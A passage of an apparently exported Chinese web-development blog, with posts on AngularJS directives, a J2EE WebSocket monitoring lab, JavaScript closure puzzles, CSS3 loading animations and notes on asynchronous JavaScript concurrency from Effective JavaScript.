page=&quot;page&quot;&gt;在指令中，可以对page.index进行赋值，于是传入者的page对象的index属性被修改了。有一些问题：首先，不能直观的预料到这个指令会怎么进行输出，page属性没有任何特别之处，其他指令也多半不会使用。其次，page应该有一个范围限制，无法进行校验，除非给page新填一个属性。最后，若使用者想在其变化时做一些操作，则不得不绑定一个回调函数的属性。 以上的问题通过ngModel都可以解决：首先，ngModel作为输出的标准方式，一看就知道指令要输出什么。其次，ngModel有一系列的错误校验机制，可对ngModel的内容进行校验，其实用单独的指令来校验结果更好，能让指令的职责更单一，更内聚。最后，ngModel有标准的通知时间，也就是ng-change指令，当屡次在input指令上看到ng-change指令时，也需要会认为这个input的通知事件，但实际收ngModel的通知事件，换句话说，有ngMode的地方就可以使用ng-change事件。12345678910111213directive('pagination', function()&#123; return &#123; restrict: 'E', require: 'ngModel', link: function(scope, elm, iAttrs, ngModeController)&#123; // ... someEvent(function(index)&#123; // 当某些事件触发时改变ngModel的值 ngModelController.$setViewValue(index); &#125;); // ... &#125; &#125;;&#125;); 打包代替动态加载前端有一个非常著名的库叫require.js,用于动态加载js文件，曾经让非常多的人着迷。但是其初衷并不是仅仅动态加载。而是在于模块化，用于弥补js语言的一些缺陷。 不过ng自己内置了模块化系统，所以require.js就不是必须的了。当有一些第三方库很大，确实需要动态加载，则进行局部化的动态加载，比如Highchart等插件，定义一个Highchart指令，当它首次使用时才动态加载highchart.js，加载完毕后调用其中的函数。这样能让整体代码尽量简化同时加快启动速度。 在非独立作用域指令中实现scope绑定假设有一个指令的使用形式如下：HTML:1&lt;some-directive name=\"1+1\" value=\"1+1\" on-event=\"vm.test(age)\"&gt;&lt;/some-directive&gt; 自定义指令通过scope表达式进行绑定，JS:12345678910directive('someDirective', function()&#123; return &#123; // ... scope: &#123; name: '@', // 绑定字面量，把值作为字符串进行解释 value: '=', // 绑定变量，把值作为scope上的表达式进行解释 onEvent: '&amp;', // 绑定事件，调用方式为on-event(value)或on-event($event, value) &#125; &#125;;&#125;); 上述自定义指令很简单，但有一个问题，scope:{}的形式让这个指令自动具有了独立作用域，而这将导致无法在同一个原生上使用其他需要作用域的指令。 对于装饰器型指令来说，解决的方法时不适用scope绑定表达式，而自己实现类似的效果。 实现绑定name属性非常简单，attrs.name,因为是字面量，只需要通过attrs直接获取字符串即可，结果为1+1。 实现绑定value属性需要一个函数的帮助，scope.$eval(attrs.value), 它会在指令的当前作用域上计算value对于的表达式，结果为2。 实现绑定event属性，表达式如下：scope.$eval(attrs.onEvent, {$event:event, age:30})。理解这个表达式需要明白：scope.$evel是一个函数，它可以接受2个参数，第一个是要计算的表达式，第二个是计算时可访问的上下文对象。比如在使用on-event(age) / on-event($event, age) / on-event(age, $event)等方式调用时，除了可以使用scope中的变量外，还可以访问$event和age这两个变量。然后，ng在这个scope上把onEvent的值vm.test(age)作为一个表达式进行解释，这个表达式的参数时一个叫age的变量，于是ng就从scope和额外变量上找名为age的属性作为参数传入，结果时vm.test函数所接收到的参数为30","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"},{"name":"links","slug":"links","permalink":"https://github.com/xmoyKING/tags/links/"}]},{"title":"j2ee课程：理解并实现ssh核心原理 + ssh实践","slug":"j2ee-little-ssh","date":"2017-03-25T05:35:05.000Z","updated":"2017-03-26T05:35:05.000Z","comments":true,"path":"2017/03/25/j2ee-little-ssh/","link":"","permalink":"https://github.com/xmoyKING/2017/03/25/j2ee-little-ssh/","excerpt":"","text":"j2ee课程安排的实验和作业，自己动手实现ssh框架的一些小功能，模拟核心特性，共分7次作业E系列，5次实验P系列。 E系列为理解并自己实现SSH中某些原理，P系列为使用SSH改造一个已有项目 E1 实现简单的MVC中的ContorllerE2 基于配置文件的ContorllerE3 有拦截器的ContorllerE4 处理视图的ContorllerE5 DAO + ContorllerE6 ORM + ContorllerE7 DI + Contorller P1 搭建SSH环境，将MVC模式运用到原有项目中，使用struts2作为CP2 在P1的基础上添加拦截器P3 使用Hibernate OR映射P4 使用Hiberante HQL，QC，QE，悲/乐观锁P5 使用Spring的DI改写原有项目","categories":[{"name":"java","slug":"java","permalink":"https://github.com/xmoyKING/categories/java/"}],"tags":[{"name":"j2ee","slug":"j2ee","permalink":"https://github.com/xmoyKING/tags/j2ee/"},{"name":"ssh","slug":"ssh","permalink":"https://github.com/xmoyKING/tags/ssh/"}]},{"title":"j2ee + websocket + mysql 实现简单监控系统","slug":"smart-j2ee-sa","date":"2017-03-24T04:44:44.000Z","updated":"2017-03-24T04:44:44.000Z","comments":true,"path":"2017/03/24/smart-j2ee-sa/","link":"","permalink":"https://github.com/xmoyKING/2017/03/24/smart-j2ee-sa/","excerpt":"","text":"今天整理以前上课做的实验：构建一个物联网智能监控系统，使其PC端能实现用户登录，实时监控各设备节点状态、配置设备、接收节点状态变更推送等功能；其分布式机器端能够接收服务器端命令，发送心跳包，发送异常信号，发送设备状态变化命令等。 环境数据库：MySql 5.1.53数据库可视化管理软件：Wamp Server浏览器：Chrome 54.0.2840.87 m (64-bit)IDE：Eclipse系统：Win10 64-bitJDK版本：1.8Web服务器：Tomcat 7.0.47 原理利用Socket客户端模拟多个主机，同时通过随机数模拟客户端的状态改变。–PC端实现用户登录，实时监控各设备节点状态、配置设备、接收节点状态变更推送等功能。–分布式机器端接收服务器端命令，发送心跳包，发送异常信号，发送设备状态变化命令等。 分布式机器端不断向socket服务器发送自身设备信息（类似心跳）。（心跳也是数据通信中的一种数据，特殊点在于定时发送，形似心跳而得名。一般来说，当客户端连接到服务端之后，为了确保了解到连接的状态真实性，或者为了防止某些网络在长时间没有数据传输时自动断开，服务端会定时发送一条数据（一般数据内容为空）给客户端。如果在一定时间内（一般选择发送3次心跳的间隔）都没有收到客户端的回复，那么就认为该客户端已经断开了，此时应该踢掉它。） 由于分布式机器端是不断地向socket服务器发送设备信息的，socket服务器要不断的访问数据库，这里为了减轻数据库的开销，我们可以在socket服务器与数据库之间分配一个缓冲池。（缓冲池是数据库连接池允许应用程序重用已存在于池中的数据库连接，以避免反复的建立新的数据库连接。这种技术能有效提高应用程序的伸缩性，因为有限的数据库连接能够给大量的客户提供服务。提高了系统性能，避免了大量建立新连接的开销。当打开一个数据库连接时，一个数据库连接池也就创建了。数据库连接池的创建与数据库连接字符串精确的相关（包括空格、大小写）。所有的连接池是根据连接字符串来区分的。在创建一个新的数据库连接时，如果连接字符串不完全相同，将创建不同的连接池。一旦数据库连接池被创建，它将一直存在直到该进程结束。维护一个非活动状态的连接池几乎不需要什么系统开销。） 客户端向web服务器发送登录请求并发起数据查询的WebSocket请求。 WebSocket服务器直接访问数据库。同时像PC客户端实时推送设备数据。 PC客户端从WebSocket服务器端获取数据后用于展示，同时将历史数据信息保存在界面的History栏中，为了及快速传输，我们选择只保存本客户端请求的连接后开始的历史记录（既得到的历史信息以连接开始的时间为起点）。 数据库设计数据字典可以理解为集合，是对数据流图中所有元素的描述。它对数据库中的每一个数据定义一个字段，包括对一切动态数据、静态数据的数据结构和相互关系等内容的说明，以保持数据在系统中的一致性，它相当于字典的作用。数据字典是分析阶段的得力工具。 用户表monitor_user表列名 数据类型 是否为NULL值用户名user_Name char(15) 否密码user_Password char(15) 否 设备表monitor_device表列名 数据类型 是否为NULL值设备号device_Id char(10) 否设备状态device_State char(1) 否门磁状态state char(1) 否小组号group_Id char(6) 否时间戳time_Stamp TIMESTAMP 否 这个是Web服务器和Soket客户端的文件组织截图，其中DBConnector是数据库连接类，WebServer是Web服务器端用于登录，注册以及请求验证，转发等功能，WebSocket是WebSocket类，用于与前端保持socket长连接的并定时推送所有的设备状态到客户端。SocketThreadServer是用多线程实现的一个Socket服务器端，主要工作是利用多线程接收多个客户端的心跳信息，然后判断其状态是否改变，若改变则将改变数据保存到数据库，若不变则不保存数据。前端展示设备的图标采用了font-awasome的css图标库。 在js脚本中已经为将来的扩展留下了很多的回调方法，比如send方法，可以发送消息至WebSocket服务器，这样就能实现控制或配置更多的设备，而不仅仅是被动接收消息。本示例主要利用了onMessage方法监听从服务器收到消息。 界面展示 主界面，右侧history栏可以看到自打开本客户端后所有设备的历史情况 使用WAMP的一个简易数据库设计 将所有的socket客户端一次性打开模拟 pdf原文，源码下载地址详细实验报告 源码地址","categories":[{"name":"mixed","slug":"mixed","permalink":"https://github.com/xmoyKING/categories/mixed/"}],"tags":[{"name":"fe","slug":"fe","permalink":"https://github.com/xmoyKING/tags/fe/"},{"name":"j2ee","slug":"j2ee","permalink":"https://github.com/xmoyKING/tags/j2ee/"},{"name":"websocket","slug":"websocket","permalink":"https://github.com/xmoyKING/tags/websocket/"},{"name":"socket","slug":"socket","permalink":"https://github.com/xmoyKING/tags/socket/"},{"name":"wamp","slug":"wamp","permalink":"https://github.com/xmoyKING/tags/wamp/"}]},{"title":"Javascript难题小集","slug":"js-questions","date":"2017-03-23T01:26:27.000Z","updated":"2017-03-22T16:00:00.000Z","comments":true,"path":"2017/03/23/js-questions/","link":"","permalink":"https://github.com/xmoyKING/2017/03/23/js-questions/","excerpt":"","text":"以下1，2来自JavaScript 填坑史1.一道容易被人轻视的面试题1234567891011121314151617function Foo() &#123; getName = function () &#123; alert (1); &#125;; return this;&#125;Foo.getName = function () &#123; alert (2);&#125;;Foo.prototype.getName = function () &#123; alert (3);&#125;;var getName = function () &#123; alert (4);&#125;;function getName() &#123; alert (5);&#125;//请写出以下输出结果：Foo.getName(); // 2getName(); // 4Foo().getName(); // 1getName(); // 1new Foo.getName(); // 2new Foo().getName(); // 3new new Foo().getName(); // 3 关键需要理解变量提升， 原型链，以及对全局对象的隐式修改 2.闭包小题123456789101112131415161718192021222324252627282930313233343536373839404142434445for(var i = 0; i &lt; 5; i++) &#123; console.log(i);&#125; for(var i = 0; i &lt; 5; i++) &#123; setTimeout(function() &#123; console.log(i); &#125;, 1000 * i);&#125;for(var i = 0; i &lt; 5; i++) &#123; (function(i) &#123; setTimeout(function() &#123; console.log(i); &#125;, i * 1000); &#125;)(i);&#125;for(var i = 0; i &lt; 5; i++) &#123; (function() &#123; setTimeout(function() &#123; console.log(i); &#125;, i * 1000); &#125;)(i);&#125;for(var i = 0; i &lt; 5; i++) &#123; setTimeout((function(i) &#123; console.log(i); &#125;)(i), i * 1000);&#125;setTimeout(function() &#123; console.log(1)&#125;, 0);new Promise(function executor(resolve) &#123; console.log(2); for( var i=0 ; i&lt;10000 ; i++ ) &#123; i == 9999 &amp;&amp; resolve(); &#125; console.log(3);&#125;).then(function() &#123; console.log(4);&#125;);console.log(5);","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"questions","slug":"questions","permalink":"https://github.com/xmoyKING/tags/questions/"}]},{"title":"11个纯CSS3实现的加载动画","slug":"css-loading","date":"2017-03-20T01:02:46.000Z","updated":"2017-03-19T16:00:00.000Z","comments":true,"path":"2017/03/20/css-loading/","link":"","permalink":"https://github.com/xmoyKING/2017/03/20/css-loading/","excerpt":"","text":"所有的CSS3动画演示其中9.九宫格方块渐进 由于有未知名的影响（未解决）出现闪烁。 纯CSS3实现的动画相比gif图片虽然减少了一次http请求，降低了加载时间和动画“大小”（一段CSS3实现的动画的代码不到1kb，但gif图片一般都在几十至上百kb） 但在兼容性上，gif动画基本通吃所有浏览器和设备，CSS3就只能在一些现代浏览器上。同时，一些复杂动画需要计算，所以偶尔会出现一些小问题，不如图片稳定。 相对而言，移动端很适合使用CSS3动画。 比如9.九宫格方块渐进 这个动画有时候就会出现闪烁。 正常情况下应该如下演示： 如下是html和css代码123456789101112&lt;h3&gt;9.九宫格方块渐进&lt;/h3&gt;&lt;div class=\"sk-cube-grid\"&gt; &lt;div class=\"sk-cube sk-cube1\"&gt;&lt;/div&gt; &lt;div class=\"sk-cube sk-cube2\"&gt;&lt;/div&gt; &lt;div class=\"sk-cube sk-cube3\"&gt;&lt;/div&gt; &lt;div class=\"sk-cube sk-cube4\"&gt;&lt;/div&gt; &lt;div class=\"sk-cube sk-cube5\"&gt;&lt;/div&gt; &lt;div class=\"sk-cube sk-cube6\"&gt;&lt;/div&gt; &lt;div class=\"sk-cube sk-cube7\"&gt;&lt;/div&gt; &lt;div class=\"sk-cube sk-cube8\"&gt;&lt;/div&gt; &lt;div class=\"sk-cube sk-cube9\"&gt;&lt;/div&gt;&lt;/div&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394/* 九宫格方块渐进 */.sk-cube-grid &#123; width: 40px; height: 40px; margin: 40px auto; /* * Spinner positions * 1 2 3 * 4 5 6 * 7 8 9 */&#125;.sk-cube-grid .sk-cube &#123; width: 33.33%; height: 33.33%; background-color: #333; float: left; -webkit-animation: sk-cubeGridScaleDelay 1.3s infinite ease-in-out; animation: sk-cubeGridScaleDelay 1.3s infinite ease-in-out;&#125;.sk-cube-grid .sk-cube1 &#123; -webkit-animation-delay: 0.2s; animation-delay: 0.2s;&#125;.sk-cube-grid .sk-cube2 &#123; -webkit-animation-delay: 0.3s; animation-delay: 0.3s;&#125;.sk-cube-grid .sk-cube3 &#123; -webkit-animation-delay: 0.4s; animation-delay: 0.4s;&#125;.sk-cube-grid .sk-cube4 &#123; -webkit-animation-delay: 0.1s; animation-delay: 0.1s;&#125;.sk-cube-grid .sk-cube5 &#123; -webkit-animation-delay: 0.2s; animation-delay: 0.2s;&#125;.sk-cube-grid .sk-cube6 &#123; -webkit-animation-delay: 0.3s; animation-delay: 0.3s;&#125;.sk-cube-grid .sk-cube7 &#123; -webkit-animation-delay: 0.0s; animation-delay: 0.0s;&#125;.sk-cube-grid .sk-cube8 &#123; -webkit-animation-delay: 0.1s; animation-delay: 0.1s;&#125;.sk-cube-grid .sk-cube9 &#123; -webkit-animation-delay: 0.2s; animation-delay: 0.2s;&#125;@-webkit-keyframes sk-cubeGridScaleDelay &#123; 0%, 70%, 100% &#123; -webkit-transform: scale3D(1, 1, 1); transform: scale3D(1, 1, 1); &#125; 35% &#123; -webkit-transform: scale3D(0, 0, 1); transform: scale3D(0, 0, 1); &#125;&#125;@keyframes sk-cubeGridScaleDelay &#123; 0%, 70%, 100% &#123; -webkit-transform: scale3D(1, 1, 1); transform: scale3D(1, 1, 1); &#125; 35% &#123; -webkit-transform: scale3D(0, 0, 1); transform: scale3D(0, 0, 1); &#125;&#125;","categories":[{"name":"css","slug":"css","permalink":"https://github.com/xmoyKING/categories/css/"}],"tags":[{"name":"css3","slug":"css3","permalink":"https://github.com/xmoyKING/tags/css3/"},{"name":"loading","slug":"loading","permalink":"https://github.com/xmoyKING/tags/loading/"}]},{"title":"CSS垂直居中的各种方法","slug":"css-vertical-middle","date":"2017-03-18T07:41:52.000Z","updated":"2017-12-06T14:50:08.946Z","comments":true,"path":"2017/03/18/css-vertical-middle/","link":"","permalink":"https://github.com/xmoyKING/2017/03/18/css-vertical-middle/","excerpt":"","text":"参考:CSS垂直居中的11种实现方式 CSS居中完整指南 翻译自：Centering in CSS: A Complete Guide 当外围是一个div(块级元素)或一个li(半内联元素)是不一样, 同时使一个行内元素或一个块级元素的垂直居中的方法也不一样. 行内元素又分可替换元素和非替换元素, img属于行内替换元素。height/width/padding/margin均可用。效果等于块元素。 行内非替换元素，例如, height/width/padding top、bottom/margin top、bottom均无效果。只能用padding left、right和padding left、right改变宽度。 以下为7种文本/行内元素居中的方式: 以下为块内元素居中的方式:","categories":[{"name":"css","slug":"css","permalink":"https://github.com/xmoyKING/categories/css/"}],"tags":[{"name":"css","slug":"css","permalink":"https://github.com/xmoyKING/tags/css/"},{"name":"vertical-middle","slug":"vertical-middle","permalink":"https://github.com/xmoyKING/tags/vertical-middle/"}]},{"title":"移动Web端知识点集合","slug":"mobile-web-app","date":"2017-03-17T02:25:56.000Z","updated":"2017-12-06T14:50:09.368Z","comments":true,"path":"2017/03/17/mobile-web-app/","link":"","permalink":"https://github.com/xmoyKING/2017/03/17/mobile-web-app/","excerpt":"","text":"链接移动端 Web 开发前端知识整理 内附大量链接！结尾处有成体系移动前端知识库参考， 移动端web开发技巧 各种林散知识点 TAT.tennylv 移动web问题小结 2014年12月左右，时间有点老了：跨终端响应式页面设计入门 其中的关于chrome字体的问题已经解决，可以允许小于12px的字体了 移动端web开发进阶 书籍知识点tap和touch的区别：tap相当于pc中的click，touch能监测到手指在屏幕上的移动","categories":[{"name":"mixed","slug":"mixed","permalink":"https://github.com/xmoyKING/categories/mixed/"}],"tags":[{"name":"links","slug":"links","permalink":"https://github.com/xmoyKING/tags/links/"},{"name":"mobile","slug":"mobile","permalink":"https://github.com/xmoyKING/tags/mobile/"},{"name":"web-app","slug":"web-app","permalink":"https://github.com/xmoyKING/tags/web-app/"}]},{"title":"effective-javascript笔记-7","slug":"effective-javascript7","date":"2017-03-09T00:34:20.000Z","updated":"2017-03-25T16:00:00.000Z","comments":true,"path":"2017/03/09/effective-javascript7/","link":"","permalink":"https://github.com/xmoyKING/2017/03/09/effective-javascript7/","excerpt":"","text":"并发JS是一种嵌入式的脚本语言, JS程序不是作为独立的应用程序运行的,而是作为大型应用程序环境下的脚本运行的. 比如Web浏览器, 具有多个窗体(Window)和标签(Tab), 没个程序需要响应不同的输入和事件, 如键盘,鼠标,网络,定时任务等. 在JS中,编写响应多个并发事件的程序非常简单, 而且有时编写者甚至都不知道自己的代码是并发的. 这得益于JS的一个简单的执行模型, 即事件队列(事件循环并发) 和 异步API. 但在官方ES标准中,并没有提及并发. 61. 不要阻塞I/O事件队列在JS中,大多的I/O操作都提供了异步的或非阻塞的API, 给程序提供一个回调函数, 一旦输入完成就可以被系统调用,而不是将程序阻塞在等待结果的线程上. 比如浏览器在加载网页过程中下载资源.123downloadAsync('http://example.com/file.txt', function(txt)&#123; ...&#125;); 系统在程序调用的时候, 会适时的介入其中, 在完成操作的瞬间调用回调函数. 系统维护了一个按事件发生顺序排列的内部事件队列, 一次调用一个已注册的回调函数. 所以JS并发的最重要的规则是不要在应用程序事件队列中使用阻塞I/O的API. 异步的API在基于事件的环境中是安全的, 因为他们迫使应用程序逻辑在一个独立的事件循环”轮询”中继续处理. 在上述下载文件的例子中, 假设下载资源需要一段时间, 在这段时间内, 有极其庞大的其他事件很可能发生. 在同步是实现中, 这些事件会堆积在事件队列中, 而事件循环将停留等待该JS代码执行完成, 这将阻塞任何其他事件的处理. 但在异步版本中, JS代码注册一个事件处理程序并立即返回, 在下载完成之前, 允许其他事件处理程序处理这期间的事件. 比如,Web中的Worker的API使大量的并行计算成为可能. 不同于传统的线程执行, Workers在一个完全隔离的状态下执行, 没有获取全局作用域或主线程页面内容的能力. 因此,他们不会阻塞主事件队列中运行的代码的执行. 在一个Worker中, 使用XMLHttpRequest同步的版本很少出问题, 下载的操作会阻塞Worker的执行, 但并不阻止页面的渲染或事件队列中的事件响应. 在服务端环境, 阻塞的API在启动开始(在服务器开始接收响应输入的请求之前)是没问题的, 但在处理请求期间, 浏览器事件队列中存在阻塞API就是灾难. 异步API使用回调函数来延缓处理代价高昂的操作以避免阻塞主应用程序 JS并发地接收事件,但会使用一个事件队列按序处理事件 在程序事件队列中不要使用阻塞的I/O 62. 在异步序列中使用嵌套或命名的回调函数借助闭包, 使用嵌套能将异步操作按照”顺序”执行. 但嵌套的异步操作很容易看懂, 但当扩展到更多的操作时, 序列会变得很笨拙.123456789downloadAsync('url1', function(url)&#123; downloadAsync(url, function(file)&#123; downloadAsync('a.txt', function(a)&#123; downloadAsync('b.txt', function(b)&#123; ... &#125;); &#125;); &#125;);&#125;); 减少过多嵌套的方法之一是将回调函数作为命名函数, 并将它们需要的附加数据作为额外的参数传递. 此条笔记不完整,原因如下:现在已经有Promise能结构良好的定义异步嵌套以及顺序调用的问题了. 63. 当心丢弃错误管理异步编程的一个问题是对错误的处理, 对同步的代码, 通过try语句块包装一段代码很容易处理所有的错误.1234567try&#123; f(); g(); h();&#125; catch(e)&#123; // ...&#125; 对于异步的代码, 多步的处理通常被分割到事件队列的单独轮次中, 因此, 不可能将他们全部包在一个try语句中. 事实上, 异步API甚至根本不抛出异常, 因为当一个异步错误发生时, 没有一个明显的执行上下文来抛出异常! 相反, 异步API倾向于将错误表示为回调函数的特定参数, 或使用一个附加的错误处理回调函数(也被称为errbacks).12345downloadAsync('url1', function(url)&#123; // ...&#125;, function(err)&#123; console.log(err);&#125;); 还有一种错误处理的风格由Node.js而起, 将回调函数的第一个参数作为错误标识, 若有错误发生就表示为错误, 否则就是一个假值, 如null. 对这种错误, 可以定义一个通用的错误处理函数, 使用if语句来控制每个回调函数.12345678function onErr(err)&#123; console.log(err);&#125;downloadAsync('url1', function(err, url)&#123; if(err) return onErr(err); // ...&#125;); 通过编写共享的错误处理函数来避免复制和粘贴错误处理代码 确保明确的处理所有的错误条件以避免丢弃错误 64. 对异步循环使用递归将循环实现为一个函数1234567891011121314function downloadOneAsync(urls, onsuccess, onfailure)&#123; var n = urls.length; function tryNextURL(i)&#123; if(i &gt;= n)&#123; onfailure(\"all download failed\"); return; &#125; downloadOneAsync(urls[i], onsuccess, function()&#123; tryNextURL(i+1); &#125;); &#125; tryNextURL(0);&#125; 通常情况下, 递归函数在调用自身太多后会产生运行错误, 由于耗尽栈空间, 最终抛出异常(栈溢出). 但异步回调函数不会耗尽栈空间, 因为异步API在其回调函数被调用前会立即返回, 其栈帧在任何递归调用将新的栈帧推入栈前, 会从调用栈中弹出. 事实上,回调函数总是在事件循环的单独轮次中被调用, 事件循环在每个轮次中调用其事件处理程序的调用栈最初是空的, 所以无论回调函数需要迭代调用多少次, 都不会耗尽栈空间. 循环不能是异步的 使用递归函数在事件循环的单独轮次中执行迭代 在事件循环的单独轮次中执行递归, 并不会导致调用栈溢出 65. 不要在计算时阻塞事件队列为了保持客户端应用程序的高度交互性和确保所有传入的请求在服务器程序中得到了充分的服务,保持事件循环的每轮次尽可能短是很重要的. 否则,事件队列会滞销, 其增长速度会超过分发处理事件程序的速度. 当程序需要执行代价高昂的计算时如何办呢? 目前没有完全正确的答案, 但是一般是使用Worker API的并发机制.12// 比如下面是一个用于搜索大量可移动距离的人工智能游戏var ai = new Worker('ai.js'); 使用ai.js源文件作为worker的脚本, 产生一个新的线程独立的事件队列的并发执行线程. 该worker运行在一个完全隔离的状态, 没有任何程序对象能直接访问. 但程序可与worker之间可以用字符串messages来交互.123var userMove = '...';ai.postMessage(JSON.stringify(&#123;userMove: userMove&#125;)); postMessage的参数被作为一个消息增加到worker的事件队列中,为了处理worker的响应, 游戏需要注册一个事件处理程序.123ai.onmessage = function(event)&#123; executeMove(JSON.parse(event.data).computerMove);&#125; 在ai.js文件中, 写了worker监听消息并执行计算下一步移动所需的工作.12345678910111213self.onmessage = function(event)&#123; var userMove = JSON.parse(event.data).userMove; var computerMove = computeNextMove(userMove); var message = JSON.stringify(&#123; computerMove: computerMove &#125;); self.postMessage(message);&#125;;function computerNextMove(userMove)&#123; ...&#125; Worker这样的API有时传递消息的开销可能很昂贵. 而且若没有这样的API,则可以将算法分解为多个步骤, 每个步骤组成一个工作块.12345678910111213// 搜索社交网络图的工作表Member.prototype.inNetwork = function(other)&#123; var visited = &#123;&#125;; var worklist = [this]; while(worklist.length &gt; 0)&#123; var member = worklist.pop(); // ... if(member === other)&#123; return true; &#125; &#125; return false;&#125;; 若while循环代价太高, 搜索时间会很长, 同时阻塞程序事件队列. 即使用Worker, 也不方便, 因为它需要复制整个网络图的状态或在worker中存储网络图的状态, 并需要频繁使用消息传递来更新和查询网络. 由于该算法是在whie循环内迭代,可以将它定义为步骤集的序列, 通过增加一个回调参数将inNetWork转换为一个匿名函数. 123456789101112131415161718192021// 将while循环替换为一个匿名的递归函数Member.prototype.inNetwork = function(other, callback)&#123; var visited = &#123;&#125;; var worklist = [this]; function next()&#123; if(worklist.length === 0)&#123; callback(false); return; &#125; var member = worklist.pop(); // ... if(member === other)&#123; callback(true); return true; &#125; // ... setTimeout(next, 0); // 下一次迭代 &#125; setTimeout(next, 0); // 第一次迭代&#125;; 以上代码中的setTimeout能立刻将回调函数添加到事件队列中, 但还可以用更好的方法替代. 比如postMessage. 同时, 若每轮次next只执行一次算法,则可能效率太低, 可以增加每轮次的迭代次数.1234567891011// 在next函数的主体外围使用循环计数器Member.prototype.inNetwork = function(other, callback)&#123; // ... function next()&#123; for(var i = 0; i &lt; 10; ++i)&#123; // ... &#125; setTimeout(next, 0); &#125; setTimeout(next, 0);&#125;; 避免在主事件队列中执行代价高昂的算法 在支持Worker API的平台, 该API可以用来在一个独立的事件队列中运行长计算程序 在Worker API不可用或代价昂贵的环境中, 考虑将计算程序分解到事件循环的多个轮次中 66. 使用计数器来执行并行操作并发事件是JS中不确定性的主要来源, 程序的执行顺序并不能保证与事件发生的顺序一致. 工具函数downloadAllAsync接收一个URL数组并下载所有文件, 返回一个存储了文件内容的数组, 每个URL对应一个字符串.downloadAllAsync不仅可以清理嵌套回调函数,而且能并行下载文件. 可以在一次事件循环中启动所有的文件的下载. 每次下载成功, 就将文件内容传入result数组, 若所有URL都成功下载,则调用onsuccess回调函数, 若有任何失败, 则调用onerror回调函数, result = null能保证若多次下载失败,onerror只被调用一次, 即第一次错误发生时.1234567891011121314151617181920212223242526272829303132333435363738394041function downloadAllAsync(urls, onsuccess, onerror)&#123; var result = [], length = urls.length; if(length === 0)&#123; // 若没有需要下载的url,则直接调用成功事件并返回结果. setTimeout(onsuccess.bind(null, result), 0); return; &#125; urls.forEach(function(url)&#123; downloadAsync(url, function(text)&#123; if(result)&#123; // 存在竞争条件, 可能会出错 result.push(text); if(result.length === url.length)&#123; onsuccess(result); &#125; &#125; &#125;, function(error)&#123; if(result)&#123; result = null; onerror(error); &#125; &#125;); &#125;);&#125;// 使用var filenames = [ 'huge.txt', // 大文件 'tiny.txt', // 小文件 'medium.txt' // 中等大小文件];downloadAllAsync(filnames, function(files)&#123; // 以下顺序无法保证 console.log('huge.file', files[0].length); console.log('tiny.file', files[1].length); console.log('medium.file', files[2].length);&#125;, function(error)&#123; console.log('error: '+ error);&#125;); 以上函数中, 当一个程序依赖于特定的事件顺序才能正常工作时, 程序就会出现数据竞争(data race), 数据竞争指多个并发操作可以修改共享的数据结构, 这取决于他们真正发生的顺序,而不是调用顺序. 当一个程序依赖于特定的时间顺序才能正常工作时, 这个程序会遭受数据竞争, 数据竞争是指多个并发操作可以修改共享的数据结构, 这取决于他们的发生顺序. 若想要不依赖事件的执行顺序而总是得到顺序的结果,我们需要将结果存储在原始索引的位置.而不是每次push到结果数组.123456789101112131415161718192021222324function downloadAllAsync(urls, onsuccess, onerror)&#123; var result = [], length = urls.length; if(length === 0)&#123; // 若没有需要下载的url,则直接调用成功事件并返回结果. setTimeout(onsuccess.bind(null, result), 0); return; &#125; urls.forEach(function(url, i)&#123; downloadAsync(url, function(text)&#123; if(result)&#123; result[i] = text; // 将结果字符串存储在原始索引处 if(result.length === url.length)&#123; onsuccess(result); &#125; &#125; &#125;, function(error)&#123; if(result)&#123; result = null; onerror(error); &#125; &#125;); &#125;);&#125; 但以上程序还是会出错, 那就是若索引为length-1的文件先下载好, 比如共3个文件,索引为2的文件先下载好,这将导致result.length被更新为3, 用户的success回调函数将被过早的调用,其参数为一个不完整的数组. 正确的实现应该是使用一个计数器来追踪操作数量.12345678910111213141516171819202122232425function downloadAllAsync(urls, onsuccess, onerror)&#123; var result = [], pending = urls.length; if(pending === 0)&#123; // 若没有需要下载的url,则直接调用成功事件并返回结果. setTimeout(onsuccess.bind(null, result), 0); return; &#125; urls.forEach(function(url, i)&#123; downloadAsync(url, function(text)&#123; if(result)&#123; result[i] = text; // 将结果字符串存储在原始索引处 --pending; // 表示完成一次操作 if(pending === 0)&#123; onsuccess(result); &#125; &#125; &#125;, function(error)&#123; if(result)&#123; result = null; onerror(error); &#125; &#125;); &#125;);&#125; JS程序中的事件发生是不确定的,即顺序是不可预测的 使用计数器避免并行操作中数据竞争 67. 绝不要同步调用异步的回调函数假设有一个downloadAsync的变种版本, 它能缓存已经下载的文件, 避免多次下载同一个文件. 在文件已经缓存的情况下, 立即调用回调函数.12345678910111213// 缓存使用Dict类var cache = new Dict();function downloadCachingAsync(url, onsuccess, onerror)&#123; if(cache.has(url))&#123; onsuccess(cache.get(url)); // 直接调用 return; &#125; return downloadAsynce(url, function(file)&#123; cache.set(url, file); onsuccess(file); &#125;, onerror);&#125; 通常情况下,downloadCachingAsync会立即提供缓存的数据, 但会有一些小问题. 首先它改变了操作的预期顺序, 比如对一个正常的异步API应该是用可预测的顺序来记录日志.1234downloadAsync('file.txt', function(file)&#123; console.log('finished');&#125;);console.log('starting'); 而使用上面的downloadCachingAsync实现, 则上述的日志可能会以任意顺序记录事件, 因为文件是否被缓存对日志顺序有很大影响. 除了日志的顺序, 异步API的目的是维持事件循环中每轮的严格分离, 这简化了并发, 通过减轻每轮事件循环的代码量而不用担心其他代码并发修改共享的数据结构. 同步调用异步回调违反了分离, 导致在当前轮完成之前, 代码用于执行一轮隔离的事件循环. 比如, 下面程序用一个剩余文件队列给用户下载和显示消息123456downloadCachingAsync(remaining[0], function(file)&#123; remaining.shift(); // ...&#125;);status.display('downloading '+ remaining[0] + '...'); 若同步调用该函数, 那么将显示错误的文件名的消息, 若队列为空时, 会显示undefined. 同步的调用异步回调函数可能导致一些问题, 64条中解释了异步回调函数本质上是以空的调用栈来调用, 因此将异步的循环实现为递归函数是安全的, 完全没有累积超越调用栈空间的危险. 同步的调用不能保证这点, 因而会使得一个表面上异步循环很可能会耗尽调用栈空间. 另一个问题是异常,对于上述的downloadCachingAsync实现, 